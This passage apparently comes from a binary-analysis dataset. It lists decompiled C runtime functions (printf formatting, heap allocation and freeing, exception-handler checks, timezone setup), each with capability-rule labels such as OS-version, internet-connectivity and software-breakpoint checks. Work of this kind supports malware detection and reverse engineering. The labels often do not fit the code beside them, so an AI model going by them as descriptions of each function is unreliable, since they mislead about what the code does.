0) {\n                            if ((uStack532 & 1) == 0) {\n                                if ((uStack532 & 2) == 0) goto code_r0x0041c214;\n                                uStack552 = 0x20;\n                            }\n                            else {\n                                uStack552 = 0x2b;\n                            }\n                        }\n                        else {\n                            uStack552 = 0x2d;\n                        }\n                        iStack556 = 1;\n                    }\ncode_r0x0041c214:\n                    arg_ch = piStack560 + (-iStack544 - iStack556);\n                    if ((uStack532 & 0xc) == 0) {\n                        fcn.0041bae4(0x20, arg_ch, param_1);\n                    }\n                    fcn.0041bb08(iStack556);\n                    if (((uVar5 & 8) != 0) && ((uVar5 & 4) == 0)) {\n                        fcn.0041bae4(0x30, arg_ch, param_1);\n                    }\n                    if ((iStack564 == 0) || (iStack544 < 1)) {\n                        fcn.0041bb08(iStack544);\n                    }\n                    else {\n                        iStack588 = iStack544;\n                        piVar8 = piStack540;\n                        do {\n                            iStack588 = iStack588 + -1;\n                            iVar7 = fcn.00421b8e(&uStack17 + 1, *piVar8);\n                            piVar8 = piVar8 + 2;\n                            if (iVar7 < 1) break;\n                            fcn.0041bb08(iVar7);\n                        } while (iStack588 != 0);\n                    }\n                    if ((uStack532 & 4) != 0) {\n                        fcn.0041bae4(0x20, arg_ch, param_1);\n                    }\n                }\n            }\n            else {\n                if (uVar10 == 0x69) {\ncode_r0x0041beaa:\n                    uStack532 = uStack532 | 0x40;\ncode_r0x0041beae:\n                    iStack544 = 10;\ncode_r0x0041beb5:\n                    if ((uStack532 & 0x8000) == 0) {\n                        param_3 = ppiVar3 + 1;\n                        if ((uStack532 & 0x20) == 0) {\n                            piVar8 = *ppiVar3;\n                            if ((uStack532 & 0x40) == 0) {\n                                piVar6 = NULL;\n                                goto code_r0x0041c126;\n                            }\n                        }\n                        else if ((uStack532 & 0x40) == 0) {\n                            piVar8 = *ppiVar3;\n                        }\n                        else {\n                            piVar8 = *ppiVar3;\n                        }\n                        piVar6 = piVar8 >> 0x1f;\n                    }\n                    else {\n                        piVar8 = *ppiVar3;\n                        piVar6 = ppiVar3[1];\n                        param_3 = ppiVar3 + 2;\n                    }\ncode_r0x0041c126:\n                    if ((((uStack532 & 0x40) != 0) && (piVar6 < 1)) && (piVar6 < 0)) {\n                        bVar11 = piVar8 != NULL;\n                        piVar8 = -piVar8;\n                        piVar6 = -(piVar6 + bVar11);\n                        uStack532 = uStack532 | 0x100;\n                    }\n                    if ((uStack532 & 0x8000) == 0) {\n                        piVar6 = NULL;\n                    }\n                    iVar12 = CONCAT44(piVar6, piVar8);\n                    if (piStack536 < 0) {\n                        piStack536 = 0x1;\n                    }\n                    else {\n                        uStack532 = uStack532 & 0xfffffff7;\n                        if (0x200 < piStack536) {\n                            piStack536 = 0x200;\n                        }\n                    }\n                    if ((piVar8 | piVar6) == 0) {\n                        iStack556 = 0;\n                    }\n                    piVar8 = &uStack17;\n                    while( true ) {\n                        iVar7 = iVar12;\n                        piVar6 = piStack536 + -1;\n                        if ((piStack536 < 1) && (iVar12 == 0)) break;\n                        piStack536 = piVar6;\n                        iVar12 = fcn.004215a0();\n                        iVar9 = extraout_ECX + 0x30;\n                        if (0x39 < iVar9) {\n                            iVar9 = iVar9 + iStack576;\n                        }\n                        *piVar8 = iVar9;\n                        piVar8 = piVar8 + -1;\n                        iStack588 = iVar7;\n                    }\n                    iStack544 = &uStack17 + -piVar8;\n                    piStack540 = piVar8 + 1;\n                    piStack536 = piVar6;\n                    if (((uStack532 & 0x200) != 0) && ((*piStack540 != '0' || (iStack544 == 0)))) {\n                        *piVar8 = '0';\n                        iStack544 = &uStack17 + -piVar8 + 1;\n                        piStack540 = piVar8;\n                    }\n                    goto code_r0x0041c1dc;\n                }\n                if (uVar10 != 0x6e) {\n                    if (uVar10 == 0x6f) {\n                        iStack544 = 8;\n                        if ((uStack532 & 0x80) != 0) {\n                            uStack532 = uStack532 | 0x200;\n                        }\n                        goto code_r0x0041beb5;\n                    }\n                    if (uVar10 == 0x70) {\n                        piStack536 = 0x8;\n                        goto code_r0x0041c082;\n                    }\n                    if (uVar10 == 0x73) {\ncode_r0x0041bde7:\n                        piVar8 = piStack536;\n                        if (piStack536 == 0xffffffff) {\n                            piVar8 = 0x7fffffff;\n                        }\n                        param_3 = ppiVar3 + 1;\n                        piStack540 = *ppiVar3;\n                        if ((uStack532 & 0x810) == 0) {\n                            piVar6 = piStack540;\n                            if (piStack540 == NULL) {\n                                piVar6 = *0x44d500;\n                                piStack540 = *0x44d500;\n                            }\n                            for (; (piVar8 != NULL && (piVar8 = piVar8 + -1,  *piVar6 != '\\0')); piVar6 = piVar6 + 1) {\n                            }\n                            iStack544 = piVar6 - piStack540;\n                        }\n                        else {\n                            if (piStack540 == NULL) {\n                                piStack540 = *0x44d504;\n                            }\n                            iStack564 = 1;\n                            for (piVar6 = piStack540; (piVar8 != NULL && (piVar8 = piVar8 + -1,  *piVar6 != 0));\n                                piVar6 = piVar6 + 2) {\n                            }\n                            iStack544 = piVar6 - piStack540 >> 1;\n                        }\n                        goto code_r0x0041c1dc;\n                    }\n                    if (uVar10 != 0x75) {\n                        if (uVar10 != 0x78) goto code_r0x0041c1dc;\n                        iStack576 = 0x27;\n                        goto code_r0x0041c085;\n                    }\n                    goto code_r0x0041beae;\n                }\n                param_3 = ppiVar3 + 1;\n                if ((uStack532 & 0x20) == 0) {\n                    **ppiVar3 = iStack548;\n                }\n                else {\n                    **ppiVar3 = iStack548;\n                }\n                iStack572 = 1;\n            }\n            if (piStack568 != NULL) {\n                fcn.00418911(piStack568);\n                piStack568 = NULL;\n            }\n        }\n        uVar10 = *param_2;\n        iVar7 = iStack584;\n        puVar2 = param_2;\n        ppiVar3 = param_3;\n    } while( true );\n}\n",
        "token_count": 4474
    },
    "0041c50e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041c50e(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00421b04(param_1[4]);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if (param_1 == 0x44d528) {\n        iVar2 = 0;\n    }\n    else {\n        if (param_1 != 0x44d548) {\n            return 0;\n        }\n        iVar2 = 1;\n    }\n    *0x4507e0 = *0x4507e0 + 1;\n    if ((*(param_1 + 3) & 0x10c) != 0) {\n        return 0;\n    }\n    piVar1 = iVar2 * 4 + 0x4507e4;\n    if (*piVar1 == 0) {\n        iVar2 = fcn.004188ff(0x1000);\n        *piVar1 = iVar2;\n        if (iVar2 == 0) {\n            param_1[2] = param_1 + 5;\n            *param_1 = param_1 + 5;\n            param_1[6] = 2;\n            param_1[1] = 2;\n            goto code_r0x0041c585;\n        }\n    }\n    iVar2 = *piVar1;\n    param_1[2] = iVar2;\n    *param_1 = iVar2;\n    param_1[6] = 0x1000;\n    param_1[1] = 0x1000;\ncode_r0x0041c585:\n    *(param_1 + 3) = *(param_1 + 3) | 0x1102;\n    return 1;\n}\n",
        "token_count": 405
    },
    "0041c596": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041c596(int32_t param_1, uint *param_2)\n\n{\n    if ((param_1 != 0) && ((*(param_2 + 0xd) & 0x10) != 0)) {\n        fcn.00421c50(param_2);\n        *(param_2 + 0xd) = *(param_2 + 0xd) & 0xee;\n        param_2[6] = 0;\n        *param_2 = 0;\n        param_2[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "0041c744": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0041c744(void)\n\n{\n    if ((*0x450784 == 2) && (4 < *0x450790)) {\n        return 1;\n    }\n    return 3;\n}\n",
        "token_count": 47
    },
    "0041c75e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.0041c75e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x450fc4 = (*_sym.imp.KERNEL32.dll_HeapCreate)(param_1 == 0, 0x1000, 0);\n    if (*0x450fc4 == 0) {\n        return 0;\n    }\n    *0x450fc8 = fcn.0041c744();\n    if ((*0x450fc8 == 3) && (iVar1 = fcn.0041c7af(0x3f8),  iVar1 == 0)) {\n        (*_sym.imp.KERNEL32.dll_HeapDestroy)(*0x450fc4);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 170
    },
    "0041c822": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c822(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar6 = arg_8h[4];\n    puVar13 = arg_ch + -4;\n    uVar15 = arg_ch - arg_8h[3] >> 0xf;\n    piVar4 = uVar15 * 0x204 + 0x144 + uVar6;\n    var_4h = *puVar13 - 1;\n    if ((var_4h & 1) == 0) {\n        puVar11 = var_4h + puVar13;\n        uVar14 = *puVar11;\n        uVar7 = *(arg_ch + -8);\n        if ((uVar14 & 1) == 0) {\n            uVar10 = (uVar14 >> 4) - 1;\n            if (0x3f < uVar10) {\n                uVar10 = 0x3f;\n            }\n            if (puVar11[1] == puVar11[2]) {\n                if (uVar10 < 0x20) {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 & 0x1f));\n                    puVar12 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        *arg_8h = *arg_8h & uVar10;\n                    }\n                }\n                else {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 - 0x20 & 0x1f));\n                    puVar12 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        arg_8h[1] = arg_8h[1] & uVar10;\n                    }\n                }\n            }\n            var_4h = var_4h + uVar14;\n            *(puVar11[2] + 4) = puVar11[1];\n            *(puVar11[1] + 8) = puVar11[2];\n        }\n        puVar11 = (var_4h >> 4) + -1;\n        if (0x3f < puVar11) {\n            puVar11 = 0x3f;\n        }\n        puVar12 = arg_8h;\n        if ((uVar7 & 1) == 0) {\n            puVar13 = puVar13 - uVar7;\n            puVar12 = (uVar7 >> 4) + -1;\n            if (0x3f < puVar12) {\n                puVar12 = 0x3f;\n            }\n            var_4h = var_4h + uVar7;\n            puVar11 = (var_4h >> 4) + -1;\n            if (0x3f < puVar11) {\n                puVar11 = 0x3f;\n            }\n            if (puVar12 != puVar11) {\n                if (puVar13[1] == puVar13[2]) {\n                    if (puVar12 < 0x20) {\n                        uVar14 = ~(0x80000000U >> (puVar12 & 0x1f));\n                        puVar3 = uVar6 + 0x44 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            *arg_8h = *arg_8h & uVar14;\n                        }\n                    }\n                    else {\n                        uVar14 = ~(0x80000000U >> (puVar12 - 0x20 & 0x1f));\n                        puVar3 = uVar6 + 0xc4 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            arg_8h[1] = arg_8h[1] & uVar14;\n                        }\n                    }\n                }\n                *(puVar13[2] + 4) = puVar13[1];\n                *(puVar13[1] + 8) = puVar13[2];\n            }\n        }\n        if (((uVar7 & 1) != 0) || (puVar12 != puVar11)) {\n            piVar1 = piVar4 + puVar11 * 2;\n            uVar14 = piVar1[1];\n            puVar13[2] = piVar1;\n            puVar13[1] = uVar14;\n            piVar1[1] = puVar13;\n            *(puVar13[1] + 8) = puVar13;\n            if (puVar13[1] == puVar13[2]) {\n                cVar5 = *(puVar11 + uVar6 + 4);\n                *(puVar11 + uVar6 + 4) = cVar5 + '\\x01';\n                uVar9 = puVar11;\n                if (puVar11 < 0x20) {\n                    if (cVar5 == '\\0') {\n                        *arg_8h = *arg_8h | 0x80000000U >> (uVar9 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 & 0x1f);\n                }\n                else {\n                    if (cVar5 == '\\0') {\n                        arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                }\n            }\n        }\n        *puVar13 = var_4h;\n        *((var_4h - 4) + puVar13) = var_4h;\n        *piVar4 = *piVar4 + -1;\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n        if (*piVar4 == 0) {\n            if (*0x450fa8 != NULL) {\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(*0x450fc0 * 0x8000 + (*0x450fa8)[3], 0x8000, 0x4000);\n                (*0x450fa8)[2] = (*0x450fa8)[2] | 0x80000000U >> (*0x450fc0 & 0x1f);\n                *((*0x450fa8)[4] + 0xc4 + *0x450fc0 * 4) = 0;\n                *((*0x450fa8)[4] + 0x43) = *((*0x450fa8)[4] + 0x43) + -1;\n                if (*((*0x450fa8)[4] + 0x43) == '\\0') {\n                    (*0x450fa8)[1] = (*0x450fa8)[1] & 0xfffffffe;\n                }\n                if ((*0x450fa8)[2] == 0xffffffff) {\n                    (*pcVar8)((*0x450fa8)[3], 0, 0x8000);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x450fc4, 0, (*0x450fa8)[4]);\n                    fcn.00418360(*0x450fa8, *0x450fa8 + 5, (*0x450fac * 0x14 - *0x450fa8) + -0x14 + *0x450fb0);\n                    *0x450fac = *0x450fac + -1;\n                    if (*0x450fa8 < arg_8h) {\n                        arg_8h = arg_8h + -5;\n                    }\n                    *0x450fb8 = *0x450fb0;\n                }\n            }\n            *0x450fa8 = arg_8h;\n            *0x450fc0 = uVar15;\n        }\n    }\n    return;\n}\n",
        "token_count": 2156
    },
    "0041cfd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041cfd6(uint32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    bool bVar18;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar8 = arg_8h + 0x17U & 0xfffffff0;\n    iVar9 = (arg_8h + 0x17U >> 4) + -1;\n    puVar10 = *0x450fb0 + *0x450fac * 5;\n    uVar7 = iVar9;\n    if (iVar9 < 0x20) {\n        uVar16 = 0xffffffff >> (uVar7 & 0x1f);\n        var_8h = 0xffffffff;\n    }\n    else {\n        uVar16 = 0;\n        var_8h = 0xffffffff >> (uVar7 - 0x20 & 0x1f);\n    }\n    bVar18 = *0x450fb8 < puVar10;\n    arg_8h = *0x450fb8;\n    while ((bVar18 && ((arg_8h[1] & var_8h | *arg_8h & uVar16) == 0))) {\n        arg_8h = arg_8h + 5;\n        bVar18 = arg_8h < puVar10;\n    }\n    puVar14 = *0x450fb0;\n    if (arg_8h == puVar10) {\n        for (; (puVar14 < *0x450fb8 && ((puVar14[1] & var_8h | *puVar14 & uVar16) == 0)); puVar14 = puVar14 + 5) {\n        }\n        arg_8h = puVar14;\n        if (puVar14 == *0x450fb8) {\n            for (; (puVar14 < puVar10 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {\n            }\n            puVar15 = *0x450fb0;\n            arg_8h = puVar14;\n            if (puVar14 == puVar10) {\n                for (; (puVar15 < *0x450fb8 && (puVar15[2] == 0)); puVar15 = puVar15 + 5) {\n                }\n                arg_8h = puVar15;\n                if ((puVar15 == *0x450fb8) && (arg_8h = fcn.0041cb3a(),  arg_8h == NULL)) {\n                    return NULL;\n                }\n            }\n            uVar6 = fcn.0041cbf1(arg_8h);\n            *arg_8h[4] = uVar6;\n            if (*arg_8h[4] == -1) {\n                return NULL;\n            }\n        }\n    }\n    piVar5 = arg_8h[4];\n    var_4h = *piVar5;\n    if ((var_4h == -1) || ((piVar5[var_4h + 0x31] & var_8h | piVar5[var_4h + 0x11] & uVar16) == 0)) {\n        var_4h = 0;\n        puVar10 = piVar5 + 0x11;\n        uVar12 = piVar5[0x31] & var_8h | *puVar10 & uVar16;\n        while (uVar12 == 0) {\n            puVar14 = puVar10 + 0x21;\n            var_4h = var_4h + 1;\n            puVar10 = puVar10 + 1;\n            uVar12 = *puVar14 & var_8h | *puVar10 & uVar16;\n        }\n    }\n    piVar3 = piVar5 + var_4h * 0x81 + 0x51;\n    iVar9 = 0;\n    uVar16 = piVar5[var_4h + 0x11] & uVar16;\n    if (uVar16 == 0) {\n        uVar16 = piVar5[var_4h + 0x31] & var_8h;\n        iVar9 = 0x20;\n    }\n    for (; -1 < uVar16; uVar16 = uVar16 << 1) {\n        iVar9 = iVar9 + 1;\n    }\n    piVar13 = piVar3[iVar9 * 2 + 1];\n    iVar11 = *piVar13 - uVar8;\n    iVar17 = (iVar11 >> 4) + -1;\n    if (0x3f < iVar17) {\n        iVar17 = 0x3f;\n    }\n    *0x450fb8 = arg_8h;\n    if (iVar17 != iVar9) {\n        if (piVar13[1] == piVar13[2]) {\n            if (iVar9 < 0x20) {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 & 0x1f));\n                piVar5[var_4h + 0x11] = uVar16 & piVar5[var_4h + 0x11];\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    *arg_8h = *arg_8h & uVar16;\n                }\n            }\n            else {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 - 0x20 & 0x1f));\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] & uVar16;\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    arg_8h[1] = arg_8h[1] & uVar16;\n                }\n            }\n        }\n        *(piVar13[2] + 4) = piVar13[1];\n        *(piVar13[1] + 8) = piVar13[2];\n        if (iVar11 == 0) goto code_r0x0041d28f;\n        piVar1 = piVar3 + iVar17 * 2;\n        iVar9 = piVar1[1];\n        piVar13[2] = piVar1;\n        piVar13[1] = iVar9;\n        piVar1[1] = piVar13;\n        *(piVar13[1] + 8) = piVar13;\n        if (piVar13[1] == piVar13[2]) {\n            cVar4 = *(iVar17 + 4 + piVar5);\n            *(iVar17 + 4 + piVar5) = cVar4 + '\\x01';\n            uVar7 = iVar17;\n            if (iVar17 < 0x20) {\n                if (cVar4 == '\\0') {\n                    *arg_8h = *arg_8h | 0x80000000U >> (uVar7 & 0x1f);\n                }\n                piVar5[var_4h + 0x11] = piVar5[var_4h + 0x11] | 0x80000000U >> (uVar7 & 0x1f);\n            }\n            else {\n                if (cVar4 == '\\0') {\n                    arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n                }\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n            }\n        }\n    }\n    if (iVar11 != 0) {\n        *piVar13 = iVar11;\n        *(iVar11 + -4 + piVar13) = iVar11;\n    }\ncode_r0x0041d28f:\n    piVar13 = piVar13 + iVar11;\n    *piVar13 = uVar8 + 1;\n    *(piVar13 + (uVar8 - 4)) = uVar8 + 1;\n    iVar9 = *piVar3;\n    *piVar3 = iVar9 + 1;\n    if (((iVar9 == 0) && (arg_8h == *0x450fa8)) && (var_4h == *0x450fc0)) {\n        *0x450fa8 = NULL;\n    }\n    *piVar5 = var_4h;\n    return piVar13 + 1;\n}\n",
        "token_count": 2102
    },
    "0041d2ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041d2ed(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_FS_OFFSET;\n    uint lpBuffer;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar4 = arg_8h;\n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedExchange;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(*(in_FS_OFFSET + 0x18) + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(*(in_FS_OFFSET + 0x18) + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar5 = puVar8;\n    do {\n        if ((*puVar5 != 0xffffffff) && (uVar10 <= *puVar5)) {\n            return 0;\n        }\n        if (puVar5[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar5 = puVar5 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar4[-2],  puVar1 < var_4h || (puVar4 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar12 = 0;\n    if (0 < *0x450948) {\n        do {\n            if (*(iVar12 * 4 + 0x450950) == uVar10) {\n                if (iVar12 < 1) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x450990, 1);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                if (*(iVar12 * 4 + 0x450950) == uVar10) goto code_r0x0041d4e8;\n                iVar12 = *0x450948 + -1;\n                if (iVar12 < 0) goto code_r0x0041d4d6;\n                goto code_r0x0041d4c6;\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < *0x450948);\n    }\n    iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(puVar8, &lpBuffer, 0x1c);\n    if (iVar12 == 0) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar6 = *(var_1ch + 0x1e) + var_1ch,  *piVar6 != 0x4550)) ||\n           (*(piVar6 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar6 + 5);\n        if (*(piVar6 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar6 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar6 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar6 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x450990, 1);\n    iVar12 = *0x450948;\n    if (iVar7 != 0) {\n        return 1;\n    }\n    iVar7 = *0x450948;\n    if (0 < *0x450948) {\n        puVar8 = *0x450948 * 4 + 0x45094c;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar7 = iVar7 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar7);\n    }\n    if (iVar7 == 0) {\n        iVar7 = 0xf;\n        if (*0x450948 < 0x10) {\n            iVar7 = *0x450948;\n        }\n        iVar11 = 0;\n        if (-1 < iVar7) {\n            do {\n                puVar8 = iVar11 * 4 + 0x450950;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar7);\n        }\n        if (iVar12 < 0x10) {\n            *0x450948 = iVar12 + 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x450990, 0);\n    return 1;\n    while (iVar12 = iVar12 + -1,  -1 < iVar12) {\ncode_r0x0041d4c6:\n        if (*(iVar12 * 4 + 0x450950) == uVar10) break;\n    }\n    if (iVar12 < 0) {\ncode_r0x0041d4d6:\n        if (*0x450948 < 0x10) {\n            *0x450948 = *0x450948 + 1;\n        }\n        iVar12 = *0x450948 + -1;\n    }\n    else if (iVar12 == 0) goto code_r0x0041d500;\ncode_r0x0041d4e8:\n    iVar7 = 0;\n    if (-1 < iVar12) {\n        do {\n            puVar8 = iVar7 * 4 + 0x450950;\n            uVar9 = *puVar8;\n            iVar7 = iVar7 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar7 <= iVar12);\n    }\ncode_r0x0041d500:\n    (*pcVar3)(0x450990, 0);\n    return 1;\n}\n",
        "token_count": 1631
    },
    "0041d516": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.0041d516(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    char *arg_8h;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    char *pcVar5;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00419d14(0x441ba8, 0x18);\n    *(unaff_EBP + -0x20) = 0;\n    fcn.0041c713(7);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = *0x450bac;\n    *(unaff_EBP + -0x28) = *0x450bac;\n    *0x450a44 = 0;\n    *0x44d954 = 0xffffffff;\n    *0x44d948 = 0xffffffff;\n    arg_8h = fcn.00421fd4(0x441ba4);\n    *(unaff_EBP + -0x24) = arg_8h;\n    if ((arg_8h == NULL) || (*arg_8h == '\\0')) {\n        if (*0x450a48 != 0) {\n            fcn.00418911(*0x450a48);\n            *0x450a48 = 0;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(0x450998);\n        pcVar2 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n        if (iVar4 != -1) {\n            *0x450a44 = 1;\n            *0x44d8b0 = *0x450998 * 0x3c;\n            if (*0x4509de != 0) {\n                *0x44d8b0 = *0x44d8b0 + *0x4509ec * 0x3c;\n            }\n            if ((*0x450a32 == 0) || (*0x450a40 == 0)) {\n                *0x44d8b4 = 0;\n                *0x44d8b8 = 0;\n            }\n            else {\n                *0x44d8b4 = 1;\n                *0x44d8b8 = (*0x450a40 - *0x4509ec) * 0x3c;\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                              (uVar3, 0, 0x45099c, 0xffffffff, *0x44d940, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar4 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x44d940 = 0;\n            }\n            else {\n                (*0x44d940)[0x3f] = 